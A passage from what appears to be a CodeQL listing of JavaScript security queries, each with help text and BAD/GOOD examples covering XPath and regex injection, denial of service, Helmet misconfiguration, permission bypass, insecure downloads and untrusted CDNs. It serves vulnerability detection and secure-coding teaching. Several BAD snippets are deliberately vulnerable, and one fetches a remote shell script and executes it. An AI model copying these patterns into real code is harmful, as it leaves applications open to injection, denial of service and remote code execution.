        subject: 'Forgot password',
        text: `Click to reset password: https://${config.hostname}/resettoken/${token}`,
      });
    });

    ```

    ## References
    * Mitre: [CWE-640: Weak Password Recovery Mechanism for Forgotten Password](https://cwe.mitre.org/data/definitions/640.html).
    * Ian Muscat: [What is a Host Header Attack?](https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/).
    * Common Weakness Enumeration: [CWE-640](https://cwe.mitre.org/data/definitions/640.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-643/XpathInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-643/XpathInjection.bqrs
  metadata:
    name: XPath injection
    description: |-
      Building an XPath expression from user-controlled sources is vulnerable to insertion of
                    malicious code by the user.
    kind: path-problem
    problem.severity: error
    security-severity: 9.8
    precision: high
    id: js/xpath-injection
    tags: |-
      security
             external/cwe/cwe-643
  queryHelp: |
    # XPath injection
    If an XPath expression is built using string concatenation, and the components of the concatenation include user input, it makes it very easy for a user to create a malicious XPath expression.


    ## Recommendation
    If user input must be included in an XPath expression, either sanitize the data or use variable references to safely embed it without altering the structure of the expression.


    ## Example
    In this example, the code accepts a user name specified by the user, and uses this unvalidated and unsanitized value in an XPath expression constructed using the `xpath` package. This is vulnerable to the user providing special characters or string sequences that change the meaning of the XPath expression to search for different values.


    ```javascript
    const express = require('express');
    const xpath = require('xpath');
    const app = express();

    app.get('/some/route', function(req, res) {
      let userName = req.param("userName");

      // BAD: Use user-provided data directly in an XPath expression
      let badXPathExpr = xpath.parse("//users/user[login/text()='" + userName + "']/home_dir/text()");
      badXPathExpr.select({
        node: root
      });
    });

    ```
    Instead, embed the user input using the variable replacement mechanism offered by `xpath`:


    ```javascript
    const express = require('express');
    const xpath = require('xpath');
    const app = express();

    app.get('/some/route', function(req, res) {
      let userName = req.param("userName");

      // GOOD: Embed user-provided data using variables
      let goodXPathExpr = xpath.parse("//users/user[login/text()=$userName]/home_dir/text()");
      goodXPathExpr.select({
        node: root,
        variables: { userName: userName }
      });
    });

    ```

    ## References
    * OWASP: [Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection).
    * OWASP: [XPath Injection](https://www.owasp.org/index.php/XPATH_Injection).
    * npm: [xpath](https://www.npmjs.com/package/xpath).
    * Common Weakness Enumeration: [CWE-643](https://cwe.mitre.org/data/definitions/643.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-693/InsecureHelmet.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-693/InsecureHelmet.bqrs
  metadata:
    name: Insecure configuration of Helmet security middleware
    description: The Helmet middleware is used to set security-related HTTP headers
      in Express applications. This query finds instances where the middleware is
      configured with important security features disabled.
    kind: problem
    problem.severity: error
    security-severity: 7.0
    precision: high
    id: js/insecure-helmet-configuration
    tags: |-
      security
              external/cwe/cwe-693
              external/cwe/cwe-1021
  queryHelp: |
    # Insecure configuration of Helmet security middleware
    [Helmet](https://helmetjs.github.io/) is a collection of middleware functions for securing Express apps. It sets various HTTP headers to guard against common web vulnerabilities. This query detects Helmet misconfigurations that can lead to security vulnerabilities, specifically:

    * Disabling frame protection
    * Disabling Content Security Policy
    Content Security Policy (CSP) helps spot and prevent injection attacks such as Cross-Site Scripting (XSS). Removing frame protections exposes an application to attacks such as clickjacking, where an attacker can trick a user into clicking on a button or link on a targeted page when they intended to click on the page carrying out the attack.

    Users of the query can extend the set of required Helmet features by adding additional checks for them, using CodeQL [data extensions](https://codeql.github.com/docs/codeql-language-guides/customizing-library-models-for-javascript/) in a [CodeQL model pack](https://docs.github.com/en/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-and-working-with-codeql-packs#creating-a-codeql-model-pack). See `CUSTOMIZING.md` in the query source for more information.


    ## Recommendation
    To help mitigate these vulnerabilities, ensure that the following Helmet functions are not disabled, and are configured appropriately to your application:

    * `frameguard`
    * `contentSecurityPolicy`

    ## Example
    The following code snippet demonstrates Helmet configured in an insecure manner:


    ```javascript
    const helmet = require('helmet');

    app.use(helmet({
        frameguard: false,
        contentSecurityPolicy: false
    }));
    ```
    In this example, the defaults are used, which enables frame protection and a default Content Security Policy.


    ```javascript
    app.use(helmet());
    ```
    You can also enable a custom Content Security Policy by passing an object to the `contentSecurityPolicy` key. For example, taken from the [Helmet docs](https://helmetjs.github.io/#content-security-policy):


    ```javascript
    app.use(
        helmet({
            contentSecurityPolicy: {
                directives: {
                    "script-src": ["'self'", "example.com"],
                    "style-src": null,
                },
            },
        })
    );
    ```

    ## References
    * [helmet.js website](https://helmetjs.github.io/)
    * [Content Security Policy (CSP) | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
    * [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)
    * [Protect against clickjacking | MDN](https://developer.mozilla.org/en-US/docs/Web/Security#protect_against_clickjacking)
    * Common Weakness Enumeration: [CWE-693](https://cwe.mitre.org/data/definitions/693.html).
    * Common Weakness Enumeration: [CWE-1021](https://cwe.mitre.org/data/definitions/1021.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-730/RegExpInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-730/RegExpInjection.bqrs
  metadata:
    name: Regular expression injection
    description: |-
      User input should not be used in regular expressions without first being escaped,
                    otherwise a malicious user may be able to inject an expression that could require
                    exponential time on certain inputs.
    kind: path-problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/regex-injection
    tags: |-
      security
             external/cwe/cwe-730
             external/cwe/cwe-400
  queryHelp: |
    # Regular expression injection
    Constructing a regular expression with unsanitized user input is dangerous as a malicious user may be able to modify the meaning of the expression. In particular, such a user may be able to provide a regular expression fragment that takes exponential time in the worst case, and use that to perform a Denial of Service attack.


    ## Recommendation
    Before embedding user input into a regular expression, use a sanitization function such as lodash's `_.escapeRegExp` to escape meta-characters that have special meaning.


    ## Example
    The following example shows a HTTP request parameter that is used to construct a regular expression without sanitizing it first:


    ```javascript
    var express = require('express');
    var app = express();

    app.get('/findKey', function(req, res) {
      var key = req.param("key"), input = req.param("input");

      // BAD: Unsanitized user input is used to construct a regular expression
      var re = new RegExp("\\b" + key + "=(.*)\n");
    });

    ```
    Instead, the request parameter should be sanitized first, for example using the function `_.escapeRegExp` from the lodash package. This ensures that the user cannot insert characters which have a special meaning in regular expressions.


    ```javascript
    var express = require('express');
    var _ = require('lodash');
    var app = express();

    app.get('/findKey', function(req, res) {
      var key = req.param("key"), input = req.param("input");

      // GOOD: User input is sanitized before constructing the regex
      var safeKey = _.escapeRegExp(key);
      var re = new RegExp("\\b" + safeKey + "=(.*)\n");
    });

    ```

    ## References
    * OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).
    * Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).
    * npm: [lodash](https://www.npmjs.com/package/lodash).
    * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-730/ServerCrash.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-730/ServerCrash.bqrs
  metadata:
    name: Server crash
    description: |-
      A server that can be forced to crash may be vulnerable to denial-of-service
                    attacks.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/server-crash
    tags: |-
      security
             external/cwe/cwe-248
             external/cwe/cwe-730
  queryHelp: |
    # Server crash
    Servers handle requests from clients until terminated deliberately by a server administrator. A client request that results in an uncaught server-side exception causes the current server response generation to fail, and should not have an effect on subsequent client requests.

    Under some circumstances, uncaught exceptions can however cause the entire server to terminate abruptly. Such a behavior is highly undesirable, especially if it gives malicious users the ability to turn off the server at will, which is an efficient denial-of-service attack.


    ## Recommendation
    Ensure that the processing of client requests can not cause uncaught exceptions to terminate the entire server abruptly.


    ## Example
    The following server code checks if a client-provided file path is valid before saving data to that path. It would be reasonable to expect that the server responds with an error in case the request contains an invalid file path. However, the server instead throws an exception, which is uncaught in the context of the asynchronous callback invocation (`fs.access(...)`). This causes the entire server to terminate abruptly.


    ```javascript
    const express = require("express"),
      fs = require("fs");

    function save(rootDir, path, content) {
      if (!isValidPath(rootDir, req.query.filePath)) {
        throw new Error(`Invalid filePath: ${req.query.filePath}`); // BAD crashes the server
      }
      // write content to disk
    }

    express().post("/save", (req, res) => {
      fs.access(rootDir, (err) => {
        if (err) {
          console.error(
            `Server setup is corrupted, ${rootDir} cannot be accessed!`
          );
          res.status(500);
          res.end();
          return;
        }
        save(rootDir, req.query.path, req.body);
        res.status(200);
        res.end();
      });
    });

    ```
    To remedy this, the server can catch the exception explicitly with a `try/catch` block, and generate an appropriate error response instead:


    ```javascript
    // ...
    express().post("/save", (req, res) => {
      fs.access(rootDir, (err) => {
        // ...
        try {
          save(rootDir, req.query.path, req.body); // GOOD exception is caught below
          res.status(200);
          res.end();
        } catch (e) {
          res.status(500);
          res.end();
        }
      });
    });

    ```
    To simplify exception handling, it may be advisable to switch to async/await syntax instead of using callbacks, which allows wrapping the entire request handler in a `try/catch` block:


    ```javascript
    // ...
    express().post("/save", async (req, res) => {
      try {
        await fs.promises.access(rootDir);
        save(rootDir, req.query.path, req.body); // GOOD exception is caught below
        res.status(200);
        res.end();
      } catch (e) {
        res.status(500);
        res.end();
      }
    });

    ```

    ## References
    * Common Weakness Enumeration: [CWE-248](https://cwe.mitre.org/data/definitions/248.html).
    * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-754/UnvalidatedDynamicMethodCall.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-754/UnvalidatedDynamicMethodCall.bqrs
  metadata:
    name: Unvalidated dynamic method call
    description: |-
      Calling a method with a user-controlled name may dispatch to
                    an unexpected target, which could cause an exception.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/unvalidated-dynamic-method-call
    tags: |-
      security
             external/cwe/cwe-754
  queryHelp: |
    # Unvalidated dynamic method call
    JavaScript makes it easy to look up object properties dynamically at runtime. In particular, methods can be looked up by name and then called. However, if the method name is user-controlled, an attacker could choose a name that makes the application invoke an unexpected method, which may cause a runtime exception. If this exception is not handled, it could be used to mount a denial-of-service attack.

    For example, there might not be a method of the given name, or the result of the lookup might not be a function. In either case the method call will throw a `TypeError` at runtime.

    Another, more subtle example is where the result of the lookup is a standard library method from `Object.prototype`, which most objects have on their prototype chain. Examples of such methods include `valueOf`, `hasOwnProperty` and `__defineSetter__`. If the method call passes the wrong number or kind of arguments to these methods, they will throw an exception.


    ## Recommendation
    It is best to avoid dynamic method lookup involving user-controlled names altogether, for instance by using a `Map` instead of a plain object.

    If the dynamic method lookup cannot be avoided, consider whitelisting permitted method names. At the very least, check that the method is an own property and not inherited from the prototype object. If the object on which the method is looked up contains properties that are not methods, you should additionally check that the result of the lookup is a function. Even if the object only contains methods, it is still a good idea to perform this check in case other properties are added to the object later on.


    ## Example
    In the following example, an HTTP request parameter `action` property is used to dynamically look up a function in the `actions` map, which is then invoked with the `payload` parameter as its argument.


    ```javascript
    var express = require('express');
    var app = express();

    var actions = {
      play(data) {
        // ...
      },
      pause(data) {
        // ...
      }
    }

    app.get('/perform/:action/:payload', function(req, res) {
      let action = actions[req.params.action];
      // BAD: `action` may not be a function
      res.end(action(req.params.payload));
    });

    ```
    The intention is to allow clients to invoke the `play` or `pause` method, but there is no check that `action` is actually the name of a method stored in `actions`. If, for example, `action` is `rewind`, `action` will be `undefined` and the call will result in a runtime error.

    The easiest way to prevent this is to turn `actions` into a `Map` and using `Map.prototype.has` to check whether the method name is valid before looking it up.


    ```javascript
    var express = require('express');
    var app = express();

    var actions = new Map();
    actions.set("play", function play(data) {
      // ...
    });
    actions.set("pause", function pause(data) {
      // ...
    });

    app.get('/perform/:action/:payload', function(req, res) {
      if (actions.has(req.params.action)) {
        if (typeof actions.get(req.params.action) === 'function'){
          let action = actions.get(req.params.action);
        }
        // GOOD: `action` is either the `play` or the `pause` function from above
        res.end(action(req.params.payload));
      } else {
        res.end("Unsupported action.");
      }
    });

    ```
    If `actions` cannot be turned into a `Map`, a `hasOwnProperty` check should be added to validate the method name:


    ```javascript
    var express = require('express');
    var app = express();

    var actions = {
      play(data) {
        // ...
      },
      pause(data) {
        // ...
      }
    }

    app.get('/perform/:action/:payload', function(req, res) {
      if (actions.hasOwnProperty(req.params.action)) {
        let action = actions[req.params.action];
        if (typeof action === 'function') {
          // GOOD: `action` is an own method of `actions`
          res.end(action(req.params.payload));
          return;
        }
      }
      res.end("Unsupported action.");
    });

    ```

    ## References
    * OWASP: [Denial of Service](https://www.owasp.org/index.php/Denial_of_Service).
    * MDN: [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map).
    * MDN: [Object.prototype](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/prototype).
    * Common Weakness Enumeration: [CWE-754](https://cwe.mitre.org/data/definitions/754.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-770/MissingRateLimiting.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-770/MissingRateLimiting.bqrs
  metadata:
    name: Missing rate limiting
    description: |-
      An HTTP request handler that performs expensive operations without
                    restricting the rate at which operations can be carried out is vulnerable
                    to denial-of-service attacks.
    kind: problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/missing-rate-limiting
    tags: |-
      security
             external/cwe/cwe-770
             external/cwe/cwe-307
             external/cwe/cwe-400
  queryHelp: |
    # Missing rate limiting
    HTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.


    ## Recommendation
    A rate-limiting middleware should be used to prevent such attacks.


    ## Example
    The following example shows an Express application that serves static files without rate limiting:


    ```javascript
    var express = require('express');
    var app = express();

    app.get('/:path', function(req, res) {
      let path = req.params.path;
      if (isValidPath(path))
        res.sendFile(path);
    });

    ```
    To prevent denial-of-service attacks, the `express-rate-limit` package can be used:


    ```javascript
    var express = require('express');
    var app = express();

    // set up rate limiter: maximum of five requests per minute
    var RateLimit = require('express-rate-limit');
    var limiter = RateLimit({
      windowMs: 15 * 60 * 1000, // 15 minutes
      max: 100, // max 100 requests per windowMs
    });

    // apply rate limiter to all requests
    app.use(limiter);

    app.get('/:path', function(req, res) {
      let path = req.params.path;
      if (isValidPath(path))
        res.sendFile(path);
    });

    ```

    ## References
    * OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).
    * Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).
    * NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).
    * Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).
    * Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-770/ResourceExhaustion.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-770/ResourceExhaustion.bqrs
  metadata:
    name: Resource exhaustion
    description: |-
      Allocating objects or timers with user-controlled
                    sizes or durations can cause resource exhaustion.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    id: js/resource-exhaustion
    precision: high
    tags: |-
      security
             external/cwe/cwe-400
             external/cwe/cwe-770
  queryHelp: "# Resource exhaustion\nApplications are constrained by how many resources\
    \ they can make use of. Failing to respect these constraints may cause the application\
    \ to be unresponsive or crash. It is therefore problematic if attackers can control\
    \ the sizes or lifetimes of allocated objects.\n\n\n## Recommendation\nEnsure\
    \ that attackers can not control object sizes and their lifetimes. If object sizes\
    \ and lifetimes must be controlled by external parties, ensure you restrict the\
    \ object sizes and lifetimes so that they are within acceptable ranges.\n\n\n\
    ## Example\nThe following example allocates a buffer with a user-controlled size.\n\
    \n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\
    \nvar server = http.createServer(function(req, res) {\n\tvar size = parseInt(url.parse(req.url,\
    \ true).query.size);\n\n\tlet buffer = Buffer.alloc(size); // BAD\n\n\t// ...\
    \ use the buffer\n});\n```\nThis is problematic since an attacker can choose a\
    \ size that makes the application run out of memory. Even worse, in older versions\
    \ of Node.js, this could leak confidential memory. To prevent such attacks, limit\
    \ the buffer size:\n\n\n```javascript\nvar http = require(\"http\"),\n    url\
    \ = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\
    \tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tif (size > 1024)\
    \ {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\t\treturn;\n\t\
    }\n\n\tlet buffer = Buffer.alloc(size); // GOOD\n\n\t// ... use the buffer\n});\n\
    ```\n\n## Example\nAs another example, consider an application that allocates\
    \ an array with a user-controlled size, and then fills it with values:\n\n\n```javascript\n\
    var http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req,\
    \ res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tlet\
    \ dogs = new Array(size).fill(\"dog\"); // BAD\n\n\t// ... use the dog\n});\n\
    ```\nThe allocation of the array itself is not problematic since arrays are allocated\
    \ sparsely, but the subsequent filling of the array will take a long time, causing\
    \ the application to be unresponsive, or even run out of memory. Again, a limit\
    \ on the size will prevent the attack:\n\n\n```javascript\nvar http = require(\"\
    http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req,\
    \ res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tif\
    \ (size > 1024) {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\
    \t\treturn;\n\t}\n\n\tlet dogs = new Array(size).fill(\"dog\"); // GOOD\n\n\t\
    // ... use the dogs\n});\n```\n\n## Example\nFinally, the following example lets\
    \ a user choose a delay after which a function is executed:\n\n\n```javascript\n\
    var http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req,\
    \ res) {\n\tvar delay = parseInt(url.parse(req.url, true).query.delay);\n\n\t\
    setTimeout(f, delay); // BAD\n\n});\n\n```\nThis is problematic because a large\
    \ delay essentially makes the application wait indefinitely before executing the\
    \ function. Repeated registrations of such delays will therefore use up all of\
    \ the memory in the application. A limit on the delay will prevent the attack:\n\
    \n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\
    \nvar server = http.createServer(function(req, res) {\n\tvar delay = parseInt(url.parse(req.url,\
    \ true).query.delay);\n\n\tif (delay > 1000) {\n\t\tres.statusCode = 400;\n\t\t\
    res.end(\"Bad request.\");\n\t\treturn;\n\t}\n\n\tsetTimeout(f, delay); // GOOD\n\
    \n});\n\n```\n\n## References\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n\
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n\
    * Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-776/XmlBomb.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-776/XmlBomb.bqrs
  metadata:
    name: XML internal entity expansion
    description: |-
      Parsing user input as an XML document with arbitrary internal
                    entity expansion is vulnerable to denial-of-service attacks.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/xml-bomb
    tags: |-
      security
             external/cwe/cwe-776
             external/cwe/cwe-400
  queryHelp: |
    # XML internal entity expansion
    Parsing untrusted XML files with a weakly configured XML parser may be vulnerable to denial-of-service (DoS) attacks exploiting uncontrolled internal entity expansion.

    In XML, so-called *internal entities* are a mechanism for introducing an abbreviation for a piece of text or part of a document. When a parser that has been configured to expand entities encounters a reference to an internal entity, it replaces the entity by the data it represents. The replacement text may itself contain other entity references, which are expanded recursively. This means that entity expansion can increase document size dramatically.

    If untrusted XML is parsed with entity expansion enabled, a malicious attacker could submit a document that contains very deeply nested entity definitions, causing the parser to take a very long time or use large amounts of memory. This is sometimes called an *XML bomb* attack.


    ## Recommendation
    The safest way to prevent XML bomb attacks is to disable entity expansion when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `libxmljs` (though not its SAX parser API), disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action is needed.


    ## Example
    The following example uses the XML parser provided by the `node-expat` package to parse a string `xmlSrc`. If that string is from an untrusted source, this code may be vulnerable to a DoS attack, since `node-expat` expands internal entities by default:


    ```javascript
    const app = require("express")(),
      expat = require("node-expat");

    app.post("upload", (req, res) => {
      let xmlSrc = req.body,
        parser = new expat.Parser();
      parser.on("startElement", handleStart);
      parser.on("text", handleText);
      parser.write(xmlSrc);
    });

    ```
    At the time of writing, `node-expat` does not provide a way of controlling entity expansion, but the example could be rewritten to use the `sax` package instead, which only expands standard entities such as `&amp;`:


    ```javascript
    const app = require("express")(),
      sax = require("sax");

    app.post("upload", (req, res) => {
      let xmlSrc = req.body,
        parser = sax.parser(true);
      parser.onopentag = handleStart;
      parser.ontext = handleText;
      parser.write(xmlSrc);
    });

    ```

    ## References
    * Wikipedia: [Billion Laughs](https://en.wikipedia.org/wiki/Billion_laughs).
    * Bryan Sullivan: [Security Briefs - XML Denial of Service Attacks and Defenses](https://msdn.microsoft.com/en-us/magazine/ee335713.aspx).
    * Common Weakness Enumeration: [CWE-776](https://cwe.mitre.org/data/definitions/776.html).
    * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-807/ConditionalBypass.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-807/ConditionalBypass.bqrs
  metadata:
    name: User-controlled bypass of security check
    description: Conditions that the user controls are not suited for making security-related
      decisions.
    kind: path-problem
    problem.severity: error
    security-severity: 7.8
    precision: medium
    id: js/user-controlled-bypass
    tags: |-
      security
             external/cwe/cwe-807
             external/cwe/cwe-290
  queryHelp: |
    # User-controlled bypass of security check
    Using user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.


    ## Recommendation
    When checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.

    Similarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.


    ## Example
    In this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.


    ```javascript
    var express = require('express');
    var app = express();
    // ...
    app.get('/full-profile/:userId', function(req, res) {

        if (req.cookies.loggedInUserId !== req.params.userId) {
            // BAD: login decision made based on user controlled data
            requireLogin();
        } else {
            // ... show private information
        }

    });

    ```
    This security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:


    ```javascript
    var express = require('express');
    var app = express();
    // ...
    app.get('/full-profile/:userId', function(req, res) {

        if (req.signedCookies.loggedInUserId !== req.params.userId) {
            // GOOD: login decision made based on server controlled data
            requireLogin();
        } else {
            // ... show private information
        }

    });

    ```

    ## References
    * Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).
    * Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-829/InsecureDownload.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-829/InsecureDownload.bqrs
  metadata:
    name: Download of sensitive file through insecure connection
    description: |-
      Downloading executables and other sensitive files over an insecure connection
                    opens up for potential man-in-the-middle attacks.
    kind: path-problem
    problem.severity: error
    security-severity: 8.1
    precision: high
    id: js/insecure-download
    tags: |-
      security
             external/cwe/cwe-829
  queryHelp: |
    # Download of sensitive file through insecure connection
    Downloading executables or other sensitive files over an unencrypted connection can leave a server open to man-in-the-middle attacks (MITM). Such an attack can allow an attacker to insert arbitrary content into the downloaded file, and in the worst case, allow the attacker to execute arbitrary code on the vulnerable system.


    ## Recommendation
    Use a secure transfer protocol when downloading executables or other sensitive files.


    ## Example
    In this example, a server downloads a shell script from a remote URL using the `node-fetch` library, and then executes this shell script.


    ```javascript
    const fetch = require("node-fetch");
    const cp = require("child_process");

    fetch('http://mydownload.example.org/myscript.sh')
        .then(res => res.text())
        .then(script => cp.execSync(script));
    ```
    The HTTP protocol is vulnerable to MITM, and thus an attacker could potentially replace the downloaded shell script with arbitrary code, which gives the attacker complete control over the system.

    The issue has been fixed in the example below by replacing the HTTP protocol with the HTTPS protocol.


    ```javascript
    const fetch = require("node-fetch");
    const cp = require("child_process");

    fetch('https://mydownload.example.org/myscript.sh')
        .then(res => res.text())
        .then(script => cp.execSync(script));
    ```

    ## References
    * Wikipedia: [Man-in-the-middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)
    * Common Weakness Enumeration: [CWE-829](https://cwe.mitre.org/data/definitions/829.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-830/FunctionalityFromUntrustedDomain.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-830/FunctionalityFromUntrustedDomain.bqrs
  metadata:
    name: Untrusted domain used in script or other content
    description: Using a resource from an untrusted or compromised domain makes your
      code vulnerable to receiving malicious code.
    kind: problem
    security-severity: 7.2
    problem.severity: error
    id: js/functionality-from-untrusted-domain
    precision: high
    tags: |-
      security
             external/cwe/cwe-830
  queryHelp: |
    # Untrusted domain used in script or other content
    Content Delivery Networks (CDNs) are used to deliver content to users quickly and efficiently. However, they can change hands or be operated by untrustworthy owners, risking the security of the sites that use them. Some CDN domains are operated by entities that have used CDNs to deliver malware, which this query identifies.

    For example, `polyfill.io` was a popular JavaScript CDN, used to support new web browser standards on older browsers. In February 2024 the domain was sold, and in June 2024 it was publicised that the domain had been used to serve malicious scripts. It was taken down later in that month, leaving a window where sites that used the service could have been compromised. The same operator runs several other CDNs, undermining trust in those too.

    Including a resource from an untrusted source or using an untrusted channel may allow an attacker to include arbitrary code in the response. When including an external resource (for example, a `script` element) on a page, it is important to ensure that the received data is not malicious.

    Even when `https` is used, an untrustworthy operator might deliver malware.

    See the \[\`CUSTOMIZING.md\`\](https://github.com/github/codeql/blob/main/javascript/ql/src/Security/CWE-830/CUSTOMIZING.md) file in the source code for this query for information on how to extend the list of untrusted domains used by this query.


    ## Recommendation
    Carefully research the ownership of a Content Delivery Network (CDN) before using it in your application.

    If you find code that originated from an untrusted domain in your application, you should review your logs to check for compromise.

    To help mitigate the risk of including a script that could be compromised in the future, consider whether you need to use polyfill or another library at all. Modern browsers do not require a polyfill, and other popular libraries were made redundant by enhancements to HTML 5.

    If you do need a polyfill service or library, move to using a CDN that you trust.

    When you use a `script` or `link` element, you should check for [subresource integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity), and pin to a hash of a version of the service that you can trust (for example, because you have audited it for security and unwanted features). A dynamic service cannot be easily used with SRI. Nevertheless, it is possible to list multiple acceptable SHA hashes in the `integrity` attribute, such as hashes for the content required for the major browsers used by your users.

    You can also choose to self-host an uncompromised version of the service or library.


    ## Example
    The following example loads the Polyfill.io library from the `polyfill.io` CDN. This use was open to malicious scripts being served by the CDN.


    ```html
    <html>
        <head>
            <title>Polyfill.io demo</title>
            <script src="https://cdn.polyfill.io/v2/polyfill.min.js" crossorigin="anonymous"></script>
        </head>
        <body>
            ...
        </body>
    </html>
    ```
    Instead, load the Polyfill library from a trusted CDN, as in the next example:


    ```html
    <html>
        <head>
            <title>Polyfill demo - Cloudflare hosted with pinned version (but no integrity checking, since it is dynamically generated)</title>
            <script src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?version=4.8.0" crossorigin="anonymous"></script>
        </head>
        <body>
            ...
        </body>
    </html>
    ```
    If you know which browsers are used by the majority of your users, you can list the hashes of the polyfills for those browsers:


    ```html
    <html>
        <head>
            <title>Polyfill demo - Cloudflare hosted with pinned version (with integrity checking for a *very limited* browser set - just an example!)</title>
            <script src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?version=4.8.0" integrity="sha384-i0IGVuZBkKZqwXTD4CH4kcksIbFx7WKFMdxN8zUhLFHpLdELF0ym0jxa6UvLhW8/ sha384-3d4jRKquKl90C9aFG+eH4lPJmtbPHgACWHrp+VomFOxF8lzx2jxqeYkhpRg18UWC" crossorigin="anonymous"></script>
        </head>
        <body>
            ...
        </body>
    </html>
    ```

    ## References
    * Sansec: [Polyfill supply chain attack hits 100K+ sites](https://sansec.io/research/polyfill-supply-chain-attack)
    * Cloudflare: [Upgrade the web. Automatically. Delivers only the polyfills required by the user's web browser.](https://cdnjs.cloudflare.com/polyfill)
    * Fastly: [New options for Polyfill.io users](https://community.fastly.com/t/new-options-for-polyfill-io-users/2540)
    * Wikipedia: [Polyfill (programming)](https://en.wikipedia.org/wiki/Polyfill_(programming))
    * MDN Web Docs: [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
